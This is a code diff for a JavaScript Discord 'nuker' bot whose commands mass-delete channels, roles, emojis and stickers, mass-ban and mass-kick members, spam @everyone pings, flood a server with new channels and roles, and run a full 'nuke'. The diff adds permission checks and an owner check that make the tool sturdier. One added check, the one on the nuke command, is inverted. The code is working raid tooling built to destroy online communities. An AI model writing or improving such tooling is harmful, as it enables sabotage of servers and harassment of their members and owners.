@@ -81,6 +81,8 @@ client.on('messageCreate', async (message) => {
         /**
          * @param {Message} message
          */
+
+        if(!message.guild.me.permissions.has('MANAGE_CHANNELS')) return message.reply("Missing Permission: `MANAGE_CHANNELS`")
         await message.delete()
         await message.guild.channels.cache.forEach(async (channel) => {
             await channel.delete()
@@ -88,6 +90,7 @@ client.on('messageCreate', async (message) => {
             .catch(() => console.log(red(`Failed to delete #${channel.name}`)))
         })
     } else if(command === 'mban'){
+        if(!message.guild.me.permissions.has('BAN_MEMBERS')) return message.reply("Missing Permission: `BAN_MEMBERS`")
         await message.delete()
         await message.guild.members.cache.forEach((member) => {
             member.ban()
@@ -95,6 +98,7 @@ client.on('messageCreate', async (message) => {
             .catch(() => console.log(red(`Failed to ban ${member.user.tag}`)))
         })
     } else if(command === 'mkick'){
+        if(!message.guild.me.permissions.has('KICK_MEMBERS')) return message.reply("Missing Permission: `KICK_MEMBERS`")
         await message.delete()
         await message.guild.members.cache.forEach((member) => {
             member.kick()
@@ -102,6 +106,7 @@ client.on('messageCreate', async (message) => {
             .catch(() => console.log(red(`Failed to kick ${member.user.tag}`)))
         })
     } else if(command === 'drole'){
+        if(!message.guild.me.permissions.has('MANAGE_ROLES')) return message.reply("Missing Permission: `MANAGE_ROLES`")
         await message.delete()
         await message.guild.roles.cache.forEach((role) => {
             role.delete()
@@ -109,6 +114,7 @@ client.on('messageCreate', async (message) => {
             .catch(() => console.log(red(`Failed to delete @${role.name}`)))
         })
     } else if(command === 'de'){
+        if(!message.guild.me.permissions.has('MANAGE_EMOJIS_AND_STICKERS')) return message.reply("Missing Permission: `MANAGE_EMOJIS_AND_STICKERS`")
         await message.delete()
         await message.guild.emojis.cache.forEach((emoji) => {
             emoji.delete()
@@ -122,6 +128,7 @@ client.on('messageCreate', async (message) => {
             .catch(() => console.log(red(`Failed to delete :${sticker.name}: (sticker)`)))
         })
     } else if(command === 'del'){
+        if(!message.guild.me.permissions.has('ADMINISTRATOR')) return message.reply("Missing Permission: `ADMINISTRATOR`")
         await message.delete()
         await message.guild.channels.cache.forEach((channel) => {
             channel.delete()
@@ -158,12 +165,14 @@ client.on('messageCreate', async (message) => {
 
         if(isNaN(amount)) return message.reply('Not a valid amount')
 
+        await message.delete()
         await message.guild.channels.cache.forEach(async (channel) => {
             for(let i = 0; i < amount; i++){
                 await channel.send(`@everyone\n${content}`)
             }
         })
     } else if(command === 'mch'){
+        if(!message.guild.me.permissions.has('MANAGE_CHANNELS')) return message.reply("Missing Permission: `MANAGE_CHANNELS`")
         let amount = args[0] || 500
         let name = args.slice(1).join(' ') || 'nuked'
 
@@ -176,6 +185,7 @@ client.on('messageCreate', async (message) => {
             .catch(e => console.log(red(`Error on creating channels - ${e}`)))
         }
     } else if(command === 'mrole'){
+        if(!message.guild.me.permissions.has('MANAGE_ROLES')) return message.reply("Missing Permission: `MANAGE_ROLES`")
         let amount = args[0] || 250
         let name = args.slice(1).join(' ') || 'nuked'
 
@@ -188,6 +198,7 @@ client.on('messageCreate', async (message) => {
             .catch(e => console.log(`Error on creating role - ${e}`))
         }
     } else if(command === 'mcp'){
+        if(!message.guild.me.permissions.has('MANAGE_CHANNELS')) return message.reply("Missing Permission: `MANAGE_CHANNELS`")
         let amount = args[0] || 500
         let name = args.slice(1).join(' ') || 'nuked'
 
@@ -207,6 +218,7 @@ client.on('messageCreate', async (message) => {
             .catch(e => console.log(red(`Error on creating and pinging channels - ${e}`)))
         }
     } else if(command === 'rename'){
+        if(!message.guild.me.permissions.has('MANAGE_NICKNAMES')) return message.reply("Missing Permission: `MANAGE_NICKNAMES`")
         const name = args.join(' ')
         if(!name) return message.reply('Please provide a nickname.')
         await message.delete()
@@ -225,6 +237,7 @@ client.on('messageCreate', async (message) => {
             .catch(() => console.log(red(`Failed to DM ${member.user.tag}`)))
         })
     } else if(command === 'nuke'){
+        if(message.guild.me.permissions.has('ADMINISTRATOR')) return message.reply("Missing Permission: `ADMINISTRATOR`")
         console.log(yellow('Start Nuking...'))
 
         await message.delete()
@@ -304,6 +317,7 @@ client.on('messageCreate', async (message) => {
         .catch(() => console.log(red(`Failed to create an invite`)))
 
     } else if(command === 'help'){
+        if(!message.guild.me.permissions.has('EMBED_LINKS')) return
         const embed = new MessageEmbed()
         .setAuthor('Nuker Commands', message.author.displayAvatarURL())
         .addField('__nuke__', '*Nuke the server*', true)
@@ -339,8 +353,9 @@ client.on('messageCreate', async (message) => {
         .addField('__Nuke Stats__', `${message.guild.channels.cache.filter(ch => ch.deletable).size} deletable channels\n${message.guild.members.cache.filter(m => m.bannable).size} bannable users\n${message.guild.roles.cache.filter(r => r.editable).size} deletable roles`, true)
         .setColor('#2f3136')
 
-        await message.channel.send({ embeds: [embed], components: [row] })
+        await message.channel.send({ embeds: [embed], components: [row] }).catch(e => console.log(e))
     } else if(command === 'stop'){
+        if(message.author.id !== ownerId) return message.reply('You are not authorized to use this command')
         await message.channel.send('Bot Stopped.')
         .then(() => process.exit())
     }
